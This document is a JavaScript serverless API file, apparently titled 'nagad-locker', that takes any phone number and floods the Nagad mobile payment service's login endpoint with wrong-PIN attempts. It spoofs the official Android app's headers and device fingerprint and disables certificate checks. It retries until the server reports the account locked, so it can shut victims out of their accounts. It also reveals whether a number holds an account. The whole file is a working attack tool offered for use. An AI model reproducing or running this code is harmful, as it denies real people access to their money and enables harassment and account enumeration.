// api/nagad-locker.js

const https = require('https');

function generateDeviceFGP() {
  return [...Array(64)].map(() => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
}

function sendRequest(phone, attempt = 1, maxAttempts = 10) {
  return new Promise((resolve) => {
    const data = JSON.stringify({
      aspId: "100012345612345",
      mpaId: null,
      password: "a20a2b7bb0842d5cf8a0c06c62",
      username: phone
    });

    const options = {
      hostname: 'app2.mynagad.com',
      port: 20002,
      path: '/api/login',
      method: 'POST',
      headers: {
        'Host': 'app2.mynagad.com:20002',
        'User-Agent': 'okhttp/3.14.9',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=UTF-8',
        'X-KM-UserId': '90617201',
        'X-KM-User-AspId': '100012345612345',
        'X-KM-User-Agent': 'ANDROID/1170',
        'X-KM-DEVICE-FGP': generateDeviceFGP(),
        'X-KM-Accept-language': 'bn',
        'X-KM-AppCode': '01',
        'Cookie': 'TS01e66e4e=01e006cfdc349eb3eecc47575b1a86adf7abce15ffec34d8e3c94f2003e99d1b98fdd527a63216d2af3001d251e96d12051ba132b017bbf62af967b59a1003aa887a50769a'
      },
      rejectUnauthorized: false
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          const message = json.message || '';

          if (message.includes("আপনার কোন নগদ অ্যাকাউন্ট নেই")) {
            resolve({ status: "Invalid Nagad Number", credit: "Tofazzal Hossain" });
          } else if (message.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
            resolve({ status: attempt === 1 ? "Already Locked" : "Locked Successful", credit: "Tofazzal Hossain" });
          } else if (message.includes("পিন ভুল হয়েছে।") && attempt < maxAttempts) {
            setTimeout(() => {
              resolve(sendRequest(phone, attempt + 1, maxAttempts));
            }, 1000);
          } else {
            resolve({ status: "Unknown", message: message, credit: "Tofazzal Hossain" });
          }
        } catch (err) {
          resolve({ status: "Error", message: "Response parse error", credit: "Tofazzal Hossain" });
        }
      });
    });

    req.on('error', () => {
      resolve({ status: "Error", message: "Request failed", credit: "Tofazzal Hossain" });
    });

    req.write(data);
    req.end();
  });
}

export default async function handler(req, res) {
  const { phone } = req.query;

  if (!phone || !/^\d{11}$/.test(phone)) {
    return res.status(400).json({
      status: "Error",
      message: "Invalid or missing phone number. Use 11 digits like 01811917222",
      credit: "Tofazzal Hossain"
    });
  }

  const result = await sendRequest(phone);
  return res.status(200).json(result);
}
